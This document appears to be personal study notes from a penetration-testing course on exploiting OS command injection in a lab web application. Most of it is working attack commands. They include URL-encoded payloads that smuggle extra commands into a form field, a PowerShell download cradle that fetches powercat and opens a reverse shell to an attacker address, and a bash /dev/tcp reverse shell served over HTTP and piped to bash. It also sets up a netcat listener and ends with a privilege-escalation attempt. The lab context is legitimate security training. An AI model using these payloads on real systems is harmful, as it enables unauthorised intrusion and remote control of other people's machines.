when command injection is found try running a simple command, like ifconfig or ipconfig.

If you notice that it is filtered or sanatized then try to be creative by for example, try to combine the **git** and **ipconfig** commands with a URL-encoded semicolon represented as "%3B". Semicolons can be used in a majority of command lines, such as PowerShell or Bash as a delimiter for multiple commands.Alternatively, we can use two ampersands, "&&", to specify two consecutive commands. For the Windows command line _(CMD)_,[4](https://portal.offsec.com/courses/pen-200-44065/learning/common-web-application-attacks-44643/command-injection-44693/os-command-injection-44652#fn-local_id_47-4) we can also use one ampersand"&".
for example:
```
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
```

handy command to check if windows machine is running powershell or cmd:
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
URL Encoded:
curl -X POST --data '(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
```

use _Powercat_[6](https://portal.offsec.com/courses/pen-200-44065/learning/common-web-application-attacks-44643/command-injection-44693/os-command-injection-44652#fn-local_id_47-6) to create a reverse shell. Powercat is a PowerShell implementation of Netcat included in Kali
 copy Powercat to the home directory for the _kali_ user, and start a Python3 web server in the same directory
 ```
kali@kali:~$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
read the script, will send a reverse shell to port 4444 and we must set the correct ip address(our kali machine) in the script before we serve the file.

we then now use injected curl command to get the windows machine to curl our http server hosting the powercat file:

```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```
 first part uses a PowerShell download cradle to load the Powercat function contained in the **powercat.ps1** script from our web server. The second command uses the _powercat_ function to create the reverse shell with the following parameters: **-c** to specify where to connect, **-p** for the port, and **-e** for executing a program
make sure to have netcat on kali listening on port 4444 as well.

```
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```

send the url encoded curl command and we should receive reverse shell!

Now on linux:

first i will create quick bash file like so:
```
echo 'bash -i >& /dev/tcp/192.168.45.230/4444 0>&1' > simple_linux_rev_shell.sh
```
 Make sure to host the python server in same dir as the rev_shell
```
sudo python3 -m http.server 80
```
 
then we will send the curl command for the target to curl our kali machine and then execute:
```
curl -s http://192.168.45.230/shell.sh | bash
URL encoded:
curl%20-s%20http%3A%2F%2F192.168.45.230%2Fsimple_linux_rev_shell.sh%20%7C%20bash
```
start nc listener on same port as the rev shell script:
```
nc -lvnp 4444
```
we are in!
run :
```
sudo su
```
see if you can elevate access